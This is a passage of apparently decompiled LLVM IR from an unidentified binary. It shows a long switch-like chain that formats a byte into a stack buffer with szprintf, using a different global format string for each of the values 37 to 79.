  %v3_10003f64 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10003f64 = zext i8 %v3_10003f64 to i32
  %v4_10003f94 = call i32 @szprintf(i32 %v2_10003f50, i32 ptrtoint ([12 x i8]* @global_var_10015858.92 to i32), i32 %v4_10003f64)
  br label %dec_label_pc_10003f98

dec_label_pc_10003f98:                            ; preds = %dec_label_pc_10003f44, %dec_label_pc_10003f50
  %v3_10003f9c = icmp eq i32 %v2_10003364, 37
  br i1 %v3_10003f9c, label %dec_label_pc_10003fa4, label %dec_label_pc_10003fec

dec_label_pc_10003fa4:                            ; preds = %dec_label_pc_10003f98
  %v2_10003fa4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003fb8 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10003fb8 = zext i8 %v3_10003fb8 to i32
  %v4_10003fe8 = call i32 @szprintf(i32 %v2_10003fa4, i32 ptrtoint ([12 x i8]* @global_var_10015864.93 to i32), i32 %v4_10003fb8)
  br label %dec_label_pc_10003fec

dec_label_pc_10003fec:                            ; preds = %dec_label_pc_10003f98, %dec_label_pc_10003fa4
  %v3_10003ff0 = icmp eq i32 %v2_10003364, 38
  br i1 %v3_10003ff0, label %dec_label_pc_10003ff8, label %dec_label_pc_10004040

dec_label_pc_10003ff8:                            ; preds = %dec_label_pc_10003fec
  %v2_10003ff8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000400c = load i8, i8* @global_var_100287eb.54, align 1
  %v4_1000400c = zext i8 %v3_1000400c to i32
  %v4_1000403c = call i32 @szprintf(i32 %v2_10003ff8, i32 ptrtoint ([13 x i8]* @global_var_10015870.94 to i32), i32 %v4_1000400c)
  br label %dec_label_pc_10004040

dec_label_pc_10004040:                            ; preds = %dec_label_pc_10003fec, %dec_label_pc_10003ff8
  %v3_10004044 = icmp eq i32 %v2_10003364, 39
  br i1 %v3_10004044, label %dec_label_pc_1000404c, label %dec_label_pc_10004094

dec_label_pc_1000404c:                            ; preds = %dec_label_pc_10004040
  %v2_1000404c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004060 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10004060 = zext i8 %v3_10004060 to i32
  %v4_10004090 = call i32 @szprintf(i32 %v2_1000404c, i32 ptrtoint ([13 x i8]* @global_var_10015880.95 to i32), i32 %v4_10004060)
  br label %dec_label_pc_10004094

dec_label_pc_10004094:                            ; preds = %dec_label_pc_10004040, %dec_label_pc_1000404c
  %v3_10004098 = icmp eq i32 %v2_10003364, 40
  br i1 %v3_10004098, label %dec_label_pc_100040a0, label %dec_label_pc_100040e8

dec_label_pc_100040a0:                            ; preds = %dec_label_pc_10004094
  %v2_100040a0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100040b4 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100040b4 = zext i8 %v3_100040b4 to i32
  %v4_100040e4 = call i32 @szprintf(i32 %v2_100040a0, i32 ptrtoint ([13 x i8]* @global_var_10015870.94 to i32), i32 %v4_100040b4)
  br label %dec_label_pc_100040e8

dec_label_pc_100040e8:                            ; preds = %dec_label_pc_10004094, %dec_label_pc_100040a0
  %v3_100040ec = icmp eq i32 %v2_10003364, 41
  br i1 %v3_100040ec, label %dec_label_pc_100040f4, label %dec_label_pc_1000413c

dec_label_pc_100040f4:                            ; preds = %dec_label_pc_100040e8
  %v2_100040f4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004108 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10004108 = zext i8 %v3_10004108 to i32
  %v4_10004138 = call i32 @szprintf(i32 %v2_100040f4, i32 ptrtoint ([13 x i8]* @global_var_10015890.96 to i32), i32 %v4_10004108)
  br label %dec_label_pc_1000413c

dec_label_pc_1000413c:                            ; preds = %dec_label_pc_100040e8, %dec_label_pc_100040f4
  %v3_10004140 = icmp eq i32 %v2_10003364, 42
  br i1 %v3_10004140, label %dec_label_pc_10004148, label %dec_label_pc_10004190

dec_label_pc_10004148:                            ; preds = %dec_label_pc_1000413c
  %v2_10004148 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000415c = load i8, i8* @global_var_100287eb.54, align 1
  %v4_1000415c = zext i8 %v3_1000415c to i32
  %v4_1000418c = call i32 @szprintf(i32 %v2_10004148, i32 ptrtoint ([13 x i8]* @global_var_100158a0.97 to i32), i32 %v4_1000415c)
  br label %dec_label_pc_10004190

dec_label_pc_10004190:                            ; preds = %dec_label_pc_1000413c, %dec_label_pc_10004148
  %v3_10004194 = icmp eq i32 %v2_10003364, 43
  br i1 %v3_10004194, label %dec_label_pc_1000419c, label %dec_label_pc_100041e4

dec_label_pc_1000419c:                            ; preds = %dec_label_pc_10004190
  %v2_1000419c = ptrtoint i32* %stack_var_-52 to i32
  %v3_100041b0 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100041b0 = zext i8 %v3_100041b0 to i32
  %v4_100041e0 = call i32 @szprintf(i32 %v2_1000419c, i32 ptrtoint ([13 x i8]* @global_var_100158b0.98 to i32), i32 %v4_100041b0)
  br label %dec_label_pc_100041e4

dec_label_pc_100041e4:                            ; preds = %dec_label_pc_10004190, %dec_label_pc_1000419c
  %v3_100041e8 = icmp eq i32 %v2_10003364, 44
  br i1 %v3_100041e8, label %dec_label_pc_100041f0, label %dec_label_pc_10004238

dec_label_pc_100041f0:                            ; preds = %dec_label_pc_100041e4
  %v2_100041f0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004204 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10004204 = zext i8 %v3_10004204 to i32
  %v4_10004234 = call i32 @szprintf(i32 %v2_100041f0, i32 ptrtoint ([13 x i8]* @global_var_100158a0.97 to i32), i32 %v4_10004204)
  br label %dec_label_pc_10004238

dec_label_pc_10004238:                            ; preds = %dec_label_pc_100041e4, %dec_label_pc_100041f0
  %v3_1000423c = icmp eq i32 %v2_10003364, 45
  br i1 %v3_1000423c, label %dec_label_pc_10004244, label %dec_label_pc_1000428c

dec_label_pc_10004244:                            ; preds = %dec_label_pc_10004238
  %v2_10004244 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004258 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10004258 = zext i8 %v3_10004258 to i32
  %v4_10004288 = call i32 @szprintf(i32 %v2_10004244, i32 ptrtoint ([13 x i8]* @global_var_100158c0.99 to i32), i32 %v4_10004258)
  br label %dec_label_pc_1000428c

dec_label_pc_1000428c:                            ; preds = %dec_label_pc_10004238, %dec_label_pc_10004244
  %v3_10004290 = icmp eq i32 %v2_10003364, 46
  br i1 %v3_10004290, label %dec_label_pc_10004298, label %dec_label_pc_100042e0

dec_label_pc_10004298:                            ; preds = %dec_label_pc_1000428c
  %v2_10004298 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100042ac = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100042ac = zext i8 %v3_100042ac to i32
  %v4_100042dc = call i32 @szprintf(i32 %v2_10004298, i32 ptrtoint ([13 x i8]* @global_var_100158d0.100 to i32), i32 %v4_100042ac)
  br label %dec_label_pc_100042e0

dec_label_pc_100042e0:                            ; preds = %dec_label_pc_1000428c, %dec_label_pc_10004298
  %v3_100042e4 = icmp eq i32 %v2_10003364, 47
  br i1 %v3_100042e4, label %dec_label_pc_100042ec, label %dec_label_pc_10004334

dec_label_pc_100042ec:                            ; preds = %dec_label_pc_100042e0
  %v2_100042ec = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004300 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10004300 = zext i8 %v3_10004300 to i32
  %v4_10004330 = call i32 @szprintf(i32 %v2_100042ec, i32 ptrtoint ([13 x i8]* @global_var_100158e0.101 to i32), i32 %v4_10004300)
  br label %dec_label_pc_10004334

dec_label_pc_10004334:                            ; preds = %dec_label_pc_100042e0, %dec_label_pc_100042ec
  %v3_10004338 = icmp eq i32 %v2_10003364, 48
  br i1 %v3_10004338, label %dec_label_pc_10004340, label %dec_label_pc_10004388

dec_label_pc_10004340:                            ; preds = %dec_label_pc_10004334
  %v2_10004340 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004354 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10004354 = zext i8 %v3_10004354 to i32
  %v4_10004384 = call i32 @szprintf(i32 %v2_10004340, i32 ptrtoint ([13 x i8]* @global_var_100158f0.102 to i32), i32 %v4_10004354)
  br label %dec_label_pc_10004388

dec_label_pc_10004388:                            ; preds = %dec_label_pc_10004334, %dec_label_pc_10004340
  %v3_1000438c = icmp eq i32 %v2_10003364, 49
  br i1 %v3_1000438c, label %dec_label_pc_10004394, label %dec_label_pc_100043dc

dec_label_pc_10004394:                            ; preds = %dec_label_pc_10004388
  %v2_10004394 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100043a8 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100043a8 = zext i8 %v3_100043a8 to i32
  %v4_100043d8 = call i32 @szprintf(i32 %v2_10004394, i32 ptrtoint ([13 x i8]* @global_var_10015900.103 to i32), i32 %v4_100043a8)
  br label %dec_label_pc_100043dc

dec_label_pc_100043dc:                            ; preds = %dec_label_pc_10004388, %dec_label_pc_10004394
  %v3_100043e0 = icmp eq i32 %v2_10003364, 50
  br i1 %v3_100043e0, label %dec_label_pc_100043e8, label %dec_label_pc_10004430

dec_label_pc_100043e8:                            ; preds = %dec_label_pc_100043dc
  %v2_100043e8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100043fc = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100043fc = zext i8 %v3_100043fc to i32
  %v4_1000442c = call i32 @szprintf(i32 %v2_100043e8, i32 ptrtoint ([13 x i8]* @global_var_10015910.104 to i32), i32 %v4_100043fc)
  br label %dec_label_pc_10004430

dec_label_pc_10004430:                            ; preds = %dec_label_pc_100043dc, %dec_label_pc_100043e8
  %v3_10004434 = icmp eq i32 %v2_10003364, 51
  br i1 %v3_10004434, label %dec_label_pc_1000443c, label %dec_label_pc_10004484

dec_label_pc_1000443c:                            ; preds = %dec_label_pc_10004430
  %v2_1000443c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004450 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10004450 = zext i8 %v3_10004450 to i32
  %v4_10004480 = call i32 @szprintf(i32 %v2_1000443c, i32 ptrtoint ([14 x i8]* @global_var_10015920.105 to i32), i32 %v4_10004450)
  br label %dec_label_pc_10004484

dec_label_pc_10004484:                            ; preds = %dec_label_pc_10004430, %dec_label_pc_1000443c
  %v3_10004488 = icmp eq i32 %v2_10003364, 52
  br i1 %v3_10004488, label %dec_label_pc_10004490, label %dec_label_pc_100044d8

dec_label_pc_10004490:                            ; preds = %dec_label_pc_10004484
  %v2_10004490 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100044a4 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100044a4 = zext i8 %v3_100044a4 to i32
  %v4_100044d4 = call i32 @szprintf(i32 %v2_10004490, i32 ptrtoint ([13 x i8]* @global_var_10015930.106 to i32), i32 %v4_100044a4)
  br label %dec_label_pc_100044d8

dec_label_pc_100044d8:                            ; preds = %dec_label_pc_10004484, %dec_label_pc_10004490
  %v3_100044dc = icmp eq i32 %v2_10003364, 53
  br i1 %v3_100044dc, label %dec_label_pc_100044e4, label %dec_label_pc_1000452c

dec_label_pc_100044e4:                            ; preds = %dec_label_pc_100044d8
  %v2_100044e4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100044f8 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100044f8 = zext i8 %v3_100044f8 to i32
  %v4_10004528 = call i32 @szprintf(i32 %v2_100044e4, i32 ptrtoint ([14 x i8]* @global_var_10015940.107 to i32), i32 %v4_100044f8)
  br label %dec_label_pc_1000452c

dec_label_pc_1000452c:                            ; preds = %dec_label_pc_100044d8, %dec_label_pc_100044e4
  %v3_10004530 = icmp eq i32 %v2_10003364, 54
  br i1 %v3_10004530, label %dec_label_pc_10004538, label %dec_label_pc_10004580

dec_label_pc_10004538:                            ; preds = %dec_label_pc_1000452c
  %v2_10004538 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000454c = load i8, i8* @global_var_100287eb.54, align 1
  %v4_1000454c = zext i8 %v3_1000454c to i32
  %v4_1000457c = call i32 @szprintf(i32 %v2_10004538, i32 ptrtoint ([13 x i8]* @global_var_10015950.108 to i32), i32 %v4_1000454c)
  br label %dec_label_pc_10004580

dec_label_pc_10004580:                            ; preds = %dec_label_pc_1000452c, %dec_label_pc_10004538
  %v3_10004584 = icmp eq i32 %v2_10003364, 55
  br i1 %v3_10004584, label %dec_label_pc_1000458c, label %dec_label_pc_100045d4

dec_label_pc_1000458c:                            ; preds = %dec_label_pc_10004580
  %v2_1000458c = ptrtoint i32* %stack_var_-52 to i32
  %v3_100045a0 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100045a0 = zext i8 %v3_100045a0 to i32
  %v4_100045d0 = call i32 @szprintf(i32 %v2_1000458c, i32 ptrtoint ([14 x i8]* @global_var_10015960.109 to i32), i32 %v4_100045a0)
  br label %dec_label_pc_100045d4

dec_label_pc_100045d4:                            ; preds = %dec_label_pc_10004580, %dec_label_pc_1000458c
  %v3_100045d8 = icmp eq i32 %v2_10003364, 56
  br i1 %v3_100045d8, label %dec_label_pc_100045e0, label %dec_label_pc_10004628

dec_label_pc_100045e0:                            ; preds = %dec_label_pc_100045d4
  %v2_100045e0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100045f4 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100045f4 = zext i8 %v3_100045f4 to i32
  %v4_10004624 = call i32 @szprintf(i32 %v2_100045e0, i32 ptrtoint ([14 x i8]* @global_var_10015970.110 to i32), i32 %v4_100045f4)
  br label %dec_label_pc_10004628

dec_label_pc_10004628:                            ; preds = %dec_label_pc_100045d4, %dec_label_pc_100045e0
  %v3_1000462c = icmp eq i32 %v2_10003364, 57
  br i1 %v3_1000462c, label %dec_label_pc_10004634, label %dec_label_pc_1000467c

dec_label_pc_10004634:                            ; preds = %dec_label_pc_10004628
  %v2_10004634 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004648 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10004648 = zext i8 %v3_10004648 to i32
  %v4_10004678 = call i32 @szprintf(i32 %v2_10004634, i32 ptrtoint ([13 x i8]* @global_var_10015980.111 to i32), i32 %v4_10004648)
  br label %dec_label_pc_1000467c

dec_label_pc_1000467c:                            ; preds = %dec_label_pc_10004628, %dec_label_pc_10004634
  %v3_10004680 = icmp eq i32 %v2_10003364, 58
  br i1 %v3_10004680, label %dec_label_pc_10004688, label %dec_label_pc_100046d0

dec_label_pc_10004688:                            ; preds = %dec_label_pc_1000467c
  %v2_10004688 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000469c = load i8, i8* @global_var_100287eb.54, align 1
  %v4_1000469c = zext i8 %v3_1000469c to i32
  %v4_100046cc = call i32 @szprintf(i32 %v2_10004688, i32 ptrtoint ([13 x i8]* @global_var_10015990.112 to i32), i32 %v4_1000469c)
  br label %dec_label_pc_100046d0

dec_label_pc_100046d0:                            ; preds = %dec_label_pc_1000467c, %dec_label_pc_10004688
  %v3_100046d4 = icmp eq i32 %v2_10003364, 59
  br i1 %v3_100046d4, label %dec_label_pc_100046dc, label %dec_label_pc_10004724

dec_label_pc_100046dc:                            ; preds = %dec_label_pc_100046d0
  %v2_100046dc = ptrtoint i32* %stack_var_-52 to i32
  %v3_100046f0 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100046f0 = zext i8 %v3_100046f0 to i32
  %v4_10004720 = call i32 @szprintf(i32 %v2_100046dc, i32 ptrtoint ([13 x i8]* @global_var_100159a0.113 to i32), i32 %v4_100046f0)
  br label %dec_label_pc_10004724

dec_label_pc_10004724:                            ; preds = %dec_label_pc_100046d0, %dec_label_pc_100046dc
  %v3_10004728 = icmp eq i32 %v2_10003364, 60
  br i1 %v3_10004728, label %dec_label_pc_10004730, label %dec_label_pc_10004778

dec_label_pc_10004730:                            ; preds = %dec_label_pc_10004724
  %v2_10004730 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004744 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10004744 = zext i8 %v3_10004744 to i32
  %v4_10004774 = call i32 @szprintf(i32 %v2_10004730, i32 ptrtoint ([13 x i8]* @global_var_100159b0.114 to i32), i32 %v4_10004744)
  br label %dec_label_pc_10004778

dec_label_pc_10004778:                            ; preds = %dec_label_pc_10004724, %dec_label_pc_10004730
  %v3_1000477c = icmp eq i32 %v2_10003364, 61
  br i1 %v3_1000477c, label %dec_label_pc_10004784, label %dec_label_pc_100047cc

dec_label_pc_10004784:                            ; preds = %dec_label_pc_10004778
  %v2_10004784 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004798 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10004798 = zext i8 %v3_10004798 to i32
  %v4_100047c8 = call i32 @szprintf(i32 %v2_10004784, i32 ptrtoint ([13 x i8]* @global_var_100159c0.115 to i32), i32 %v4_10004798)
  br label %dec_label_pc_100047cc

dec_label_pc_100047cc:                            ; preds = %dec_label_pc_10004778, %dec_label_pc_10004784
  %v3_100047d0 = icmp eq i32 %v2_10003364, 62
  br i1 %v3_100047d0, label %dec_label_pc_100047d8, label %dec_label_pc_10004820

dec_label_pc_100047d8:                            ; preds = %dec_label_pc_100047cc
  %v2_100047d8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100047ec = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100047ec = zext i8 %v3_100047ec to i32
  %v4_1000481c = call i32 @szprintf(i32 %v2_100047d8, i32 ptrtoint ([13 x i8]* @global_var_100159d0.116 to i32), i32 %v4_100047ec)
  br label %dec_label_pc_10004820

dec_label_pc_10004820:                            ; preds = %dec_label_pc_100047cc, %dec_label_pc_100047d8
  %v3_10004824 = icmp eq i32 %v2_10003364, 63
  br i1 %v3_10004824, label %dec_label_pc_1000482c, label %dec_label_pc_10004874

dec_label_pc_1000482c:                            ; preds = %dec_label_pc_10004820
  %v2_1000482c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004840 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10004840 = zext i8 %v3_10004840 to i32
  %v4_10004870 = call i32 @szprintf(i32 %v2_1000482c, i32 ptrtoint ([13 x i8]* @global_var_100159e0.117 to i32), i32 %v4_10004840)
  br label %dec_label_pc_10004874

dec_label_pc_10004874:                            ; preds = %dec_label_pc_10004820, %dec_label_pc_1000482c
  %v3_10004878 = icmp eq i32 %v2_10003364, 64
  br i1 %v3_10004878, label %dec_label_pc_10004880, label %dec_label_pc_100048c8

dec_label_pc_10004880:                            ; preds = %dec_label_pc_10004874
  %v2_10004880 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004894 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10004894 = zext i8 %v3_10004894 to i32
  %v4_100048c4 = call i32 @szprintf(i32 %v2_10004880, i32 ptrtoint ([13 x i8]* @global_var_100159f0.118 to i32), i32 %v4_10004894)
  br label %dec_label_pc_100048c8

dec_label_pc_100048c8:                            ; preds = %dec_label_pc_10004874, %dec_label_pc_10004880
  %v3_100048cc = icmp eq i32 %v2_10003364, 65
  br i1 %v3_100048cc, label %dec_label_pc_100048d4, label %dec_label_pc_1000491c

dec_label_pc_100048d4:                            ; preds = %dec_label_pc_100048c8
  %v2_100048d4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100048e8 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100048e8 = zext i8 %v3_100048e8 to i32
  %v4_10004918 = call i32 @szprintf(i32 %v2_100048d4, i32 ptrtoint ([13 x i8]* @global_var_10015a00.119 to i32), i32 %v4_100048e8)
  br label %dec_label_pc_1000491c

dec_label_pc_1000491c:                            ; preds = %dec_label_pc_100048c8, %dec_label_pc_100048d4
  %v3_10004920 = icmp eq i32 %v2_10003364, 66
  br i1 %v3_10004920, label %dec_label_pc_10004928, label %dec_label_pc_10004970

dec_label_pc_10004928:                            ; preds = %dec_label_pc_1000491c
  %v2_10004928 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000493c = load i8, i8* @global_var_100287eb.54, align 1
  %v4_1000493c = zext i8 %v3_1000493c to i32
  %v4_1000496c = call i32 @szprintf(i32 %v2_10004928, i32 ptrtoint ([13 x i8]* @global_var_10015a10.120 to i32), i32 %v4_1000493c)
  br label %dec_label_pc_10004970

dec_label_pc_10004970:                            ; preds = %dec_label_pc_1000491c, %dec_label_pc_10004928
  %v3_10004974 = icmp eq i32 %v2_10003364, 67
  br i1 %v3_10004974, label %dec_label_pc_1000497c, label %dec_label_pc_100049c4

dec_label_pc_1000497c:                            ; preds = %dec_label_pc_10004970
  %v2_1000497c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004990 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10004990 = zext i8 %v3_10004990 to i32
  %v4_100049c0 = call i32 @szprintf(i32 %v2_1000497c, i32 ptrtoint ([13 x i8]* @global_var_10015a20.121 to i32), i32 %v4_10004990)
  br label %dec_label_pc_100049c4

dec_label_pc_100049c4:                            ; preds = %dec_label_pc_10004970, %dec_label_pc_1000497c
  %v3_100049c8 = icmp eq i32 %v2_10003364, 68
  br i1 %v3_100049c8, label %dec_label_pc_100049d0, label %dec_label_pc_10004a18

dec_label_pc_100049d0:                            ; preds = %dec_label_pc_100049c4
  %v2_100049d0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100049e4 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100049e4 = zext i8 %v3_100049e4 to i32
  %v4_10004a14 = call i32 @szprintf(i32 %v2_100049d0, i32 ptrtoint ([13 x i8]* @global_var_10015a30.122 to i32), i32 %v4_100049e4)
  br label %dec_label_pc_10004a18

dec_label_pc_10004a18:                            ; preds = %dec_label_pc_100049c4, %dec_label_pc_100049d0
  %v3_10004a1c = icmp eq i32 %v2_10003364, 69
  br i1 %v3_10004a1c, label %dec_label_pc_10004a24, label %dec_label_pc_10004a6c

dec_label_pc_10004a24:                            ; preds = %dec_label_pc_10004a18
  %v2_10004a24 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004a38 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10004a38 = zext i8 %v3_10004a38 to i32
  %v4_10004a68 = call i32 @szprintf(i32 %v2_10004a24, i32 ptrtoint ([13 x i8]* @global_var_10015a40.123 to i32), i32 %v4_10004a38)
  br label %dec_label_pc_10004a6c

dec_label_pc_10004a6c:                            ; preds = %dec_label_pc_10004a18, %dec_label_pc_10004a24
  %v3_10004a70 = icmp eq i32 %v2_10003364, 70
  br i1 %v3_10004a70, label %dec_label_pc_10004a78, label %dec_label_pc_10004ac0

dec_label_pc_10004a78:                            ; preds = %dec_label_pc_10004a6c
  %v2_10004a78 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004a8c = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10004a8c = zext i8 %v3_10004a8c to i32
  %v4_10004abc = call i32 @szprintf(i32 %v2_10004a78, i32 ptrtoint ([13 x i8]* @global_var_10015a50.124 to i32), i32 %v4_10004a8c)
  br label %dec_label_pc_10004ac0

dec_label_pc_10004ac0:                            ; preds = %dec_label_pc_10004a6c, %dec_label_pc_10004a78
  %v3_10004ac4 = icmp eq i32 %v2_10003364, 71
  br i1 %v3_10004ac4, label %dec_label_pc_10004acc, label %dec_label_pc_10004b14

dec_label_pc_10004acc:                            ; preds = %dec_label_pc_10004ac0
  %v2_10004acc = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004ae0 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10004ae0 = zext i8 %v3_10004ae0 to i32
  %v4_10004b10 = call i32 @szprintf(i32 %v2_10004acc, i32 ptrtoint ([13 x i8]* @global_var_10015a60.125 to i32), i32 %v4_10004ae0)
  br label %dec_label_pc_10004b14

dec_label_pc_10004b14:                            ; preds = %dec_label_pc_10004ac0, %dec_label_pc_10004acc
  %v3_10004b18 = icmp eq i32 %v2_10003364, 72
  br i1 %v3_10004b18, label %dec_label_pc_10004b20, label %dec_label_pc_10004b68

dec_label_pc_10004b20:                            ; preds = %dec_label_pc_10004b14
  %v2_10004b20 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004b34 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10004b34 = zext i8 %v3_10004b34 to i32
  %v4_10004b64 = call i32 @szprintf(i32 %v2_10004b20, i32 ptrtoint ([13 x i8]* @global_var_10015a70.126 to i32), i32 %v4_10004b34)
  br label %dec_label_pc_10004b68

dec_label_pc_10004b68:                            ; preds = %dec_label_pc_10004b14, %dec_label_pc_10004b20
  %v3_10004b6c = icmp eq i32 %v2_10003364, 73
  br i1 %v3_10004b6c, label %dec_label_pc_10004b74, label %dec_label_pc_10004bbc

dec_label_pc_10004b74:                            ; preds = %dec_label_pc_10004b68
  %v2_10004b74 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004b88 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10004b88 = zext i8 %v3_10004b88 to i32
  %v4_10004bb8 = call i32 @szprintf(i32 %v2_10004b74, i32 ptrtoint ([13 x i8]* @global_var_10015a80.127 to i32), i32 %v4_10004b88)
  br label %dec_label_pc_10004bbc

dec_label_pc_10004bbc:                            ; preds = %dec_label_pc_10004b68, %dec_label_pc_10004b74
  %v3_10004bc0 = icmp eq i32 %v2_10003364, 74
  br i1 %v3_10004bc0, label %dec_label_pc_10004bc8, label %dec_label_pc_10004c10

dec_label_pc_10004bc8:                            ; preds = %dec_label_pc_10004bbc
  %v2_10004bc8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004bdc = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10004bdc = zext i8 %v3_10004bdc to i32
  %v4_10004c0c = call i32 @szprintf(i32 %v2_10004bc8, i32 ptrtoint ([13 x i8]* @global_var_10015a90.128 to i32), i32 %v4_10004bdc)
  br label %dec_label_pc_10004c10

dec_label_pc_10004c10:                            ; preds = %dec_label_pc_10004bbc, %dec_label_pc_10004bc8
  %v3_10004c14 = icmp eq i32 %v2_10003364, 75
  br i1 %v3_10004c14, label %dec_label_pc_10004c1c, label %dec_label_pc_10004c64

dec_label_pc_10004c1c:                            ; preds = %dec_label_pc_10004c10
  %v2_10004c1c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004c30 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10004c30 = zext i8 %v3_10004c30 to i32
  %v4_10004c60 = call i32 @szprintf(i32 %v2_10004c1c, i32 ptrtoint ([13 x i8]* @global_var_10015aa0.129 to i32), i32 %v4_10004c30)
  br label %dec_label_pc_10004c64

dec_label_pc_10004c64:                            ; preds = %dec_label_pc_10004c10, %dec_label_pc_10004c1c
  %v3_10004c68 = icmp eq i32 %v2_10003364, 76
  br i1 %v3_10004c68, label %dec_label_pc_10004c70, label %dec_label_pc_10004cb8

dec_label_pc_10004c70:                            ; preds = %dec_label_pc_10004c64
  %v2_10004c70 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004c84 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10004c84 = zext i8 %v3_10004c84 to i32
  %v4_10004cb4 = call i32 @szprintf(i32 %v2_10004c70, i32 ptrtoint ([13 x i8]* @global_var_10015ab0.130 to i32), i32 %v4_10004c84)
  br label %dec_label_pc_10004cb8

dec_label_pc_10004cb8:                            ; preds = %dec_label_pc_10004c64, %dec_label_pc_10004c70
  %v3_10004cbc = icmp eq i32 %v2_10003364, 77
  br i1 %v3_10004cbc, label %dec_label_pc_10004cc4, label %dec_label_pc_10004d0c

dec_label_pc_10004cc4:                            ; preds = %dec_label_pc_10004cb8
  %v2_10004cc4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004cd8 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10004cd8 = zext i8 %v3_10004cd8 to i32
  %v4_10004d08 = call i32 @szprintf(i32 %v2_10004cc4, i32 ptrtoint ([13 x i8]* @global_var_10015ac0.131 to i32), i32 %v4_10004cd8)
  br label %dec_label_pc_10004d0c

dec_label_pc_10004d0c:                            ; preds = %dec_label_pc_10004cb8, %dec_label_pc_10004cc4
  %v3_10004d10 = icmp eq i32 %v2_10003364, 78
  br i1 %v3_10004d10, label %dec_label_pc_10004d18, label %dec_label_pc_10004d60

dec_label_pc_10004d18:                            ; preds = %dec_label_pc_10004d0c
  %v2_10004d18 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004d2c = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10004d2c = zext i8 %v3_10004d2c to i32
  %v4_10004d5c = call i32 @szprintf(i32 %v2_10004d18, i32 ptrtoint ([13 x i8]* @global_var_10015ad0.132 to i32), i32 %v4_10004d2c)
  br label %dec_label_pc_10004d60

dec_label_pc_10004d60:                            ; preds = %dec_label_pc_10004d0c, %dec_label_pc_10004d18
  %v3_10004d64 = icmp eq i32 %v2_10003364, 79
  br i1 %v3_10004d64, label %dec_label_pc_10004d6c, label %dec_label_pc_10004db4

dec_label_pc_10004d6c:                            ; preds = %dec_label_pc_10004d60
  %v2_10004d6c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004d80 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10004d80 = zext i8 %v3_10004d80 to i32
  %v4_10004db0 = call i32 @szprintf(i32 %v2_10004d6c, i32 ptrtoint ([13 x i8]* @global_var_10015ae0.133 to i32), i32 %v4_10004d80)
  br label %dec_label_pc_10004db4

dec_label_pc_10004db4:                            ; preds = %dec_label_pc_10004d60, %dec_label_pc_10004d6c
